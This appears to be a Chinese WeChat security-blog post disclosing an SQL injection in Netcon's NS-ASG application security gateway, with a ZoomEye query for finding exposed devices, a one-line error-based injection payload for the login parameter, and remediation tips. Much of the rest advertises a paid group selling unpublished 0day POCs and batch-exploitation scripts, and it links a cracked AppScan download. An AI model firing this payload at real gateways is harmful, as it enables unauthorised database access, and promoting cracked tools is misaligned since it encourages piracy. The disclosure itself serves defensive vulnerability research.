#  网康应用安全网关(NS-ASG) SQL注入漏洞   
原创 漏洞挖掘  渗透安全HackTwo   2024-01-06 10:53  
  
###   
#   
0x01 产品简介  
          
网康科技的NS-ASG应用安全网关是一款软硬件一体化的产品，集成了SSL和IPSec，旨在保障业务访问的安全性，适配所有移动终端，提供多种链路均衡和选择技术，支持多种认证方式灵活组合，以及内置短信认证、LDAP令牌、USB KEY等多达13种认证方式  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq4ZamW9PhfUmWRLMkr8bFkeXntcQ9VZ2wGyuULmLepy2UjmzXeRcdsK48odJzDnjo47cZkico3A9yQ/640?wx_fmt=png&from=appmsg "")  
  
末尾可领取资源  
#   
  
**今日星球新增1day/0day未公开漏洞-公告******  
  
> ****  
> 1.用友移动管理系统某接口文件上传漏洞  
  
> 2.jeecg漏洞合集POC  
> 3.蓝凌-EIS-漏洞合集POC  
>   
> **未公开漏洞1day、0day的POC及批量利用脚本后台回复"星球"加入内部获取！！**  
>   
>         声明，请自行搭建环境进行漏洞测试，该公众号分享的工具、项目、漏洞仅供安全研究与学习之用请勿用于非法行为，如用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
>   
  
  
  
0x02 漏洞描述        SQL注入（SQLi）是一种网络安全漏洞，允许攻击者干扰应用程序对其数据库的查询。通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，而网站应用程序未对其进行过滤，SQL语句带入数据库使恶意SQL语句得以执行可以查看通常无法检索的数据。这可能包括属于其他用户的数据，或应用程序本身能够访问的任何其他数据。在许多情况下，攻击者可以修改或删除这些数据，从而导致应用程序的内容或行为发生持续变化。‍0x03 ZoomEye语法title:"网康-NS-ASG-应用安全网关"POCcheck_username=123&check_username1=123&check_passwd=123&action=login_check&check_VirtualSiteId=1/**/and/**/updatexml(1,concat(0x7e,(md5(123))),3)#&imgcode=undefined&selvalue=2&BackgroundName=background.gif0x04 修复建议1..对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。2.确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。3.数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。4.避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。5.过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。0x05 内部福利介绍        需要加入内部知识星球可点击下方链接，内部包含但不限于网上未公开的1day/0day，2024最新企业SRC/CNVD/Edu实战挖掘技巧报告，红队外网打点、红队内网横向渗透。内部干货多及渗透思路很多，对新人友好，实战报告赏金几百到几千不等，加入圈子拥有FOFA、shadan、360Quake、ZoomEye、Hunter、CTFshow、Tide等等高级会员，安全培训教程，某机构红队教程，SRC挖掘培训课，SRC文档，武器库。圈子里面资料价值至少在10K以上，目前星球内部主题300+，资源2000+，其他和网盘资源1w+覆盖全网星球、纷传90%以上内容并持续更新中，越早加入价格越低。(详情点击下方地址了解-->>还是觉得价格贵的师傅后台回复" 星球 "有优惠券使用名额有限先到先得)点击了解-->>内部VIP知识星球福利介绍V1.2版本-元旦优惠  
  
****  
结尾  
  
# 免责声明  
  
  
# 获取方法  
  
  
**关注领取资源：**  
  
  
回复“app" 获取  app渗透和app抓包教程  
  
回复“渗透字典" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。  
  
回复“书籍" 获取 网络安全相关经典书籍电子版pdf  
  
  
**压缩包解压密码：HackTwo**  
  
********  
  
# 最后必看  
  
  
    本工具或文章仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，如果你学习了该文章内容需要测试请自行搭建靶机环境，勿用于非法行为。  
  
  
    为避免被恶意使用，本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。  
  
  
      
  
文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担。  
  
  
    在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。  
  
  
    如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。本工具或文章来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
****  
  
  
  
# 往期推荐  
  
  
**1. 内部VIP知识星球福利介绍V1.2版本-元旦优惠**  
  
**2. 最新BurpSuite2023.12.1专业版中英文版下载**  
  
[3. 最新Nessus2023下载Windows/Linux](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247484713&idx=1&sn=0fdab59445d9e0849843077365607b18&chksm=cf16a399f8612a8f6feb8362b1d946ea15ce4ff8a4a4cf0ce2c21f433185c622136b3c5725f3&scene=21#wechat_redirect)  
  
  
[4. 最新xray1.9.11高级版下载Windows/Linux](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483882&idx=1&sn=e1bf597eb73ee7881ae132cc99ac0c8e&chksm=cf16a75af8612e4c73eda9f52218ccfc6de72725eb37aff59e181435de095b71e653b446c521&scene=21#wechat_redirect)  
  
  
[5. 最新HCL AppScan Standard 10.2.128273破解版下载](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483850&idx=1&sn=8fad4ed1e05443dce28f6ee6d89ab920&chksm=cf16a77af8612e6c688c55f7a899fe123b0f71735eb15988321d0bd4d14363690c96537bc1fb&scene=21#wechat_redirect)  
  
  
  
###### 渗透安全HackTwo  
  
  
微信号：关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
  
喜欢的朋友可以点赞转发支持一下  
  
  
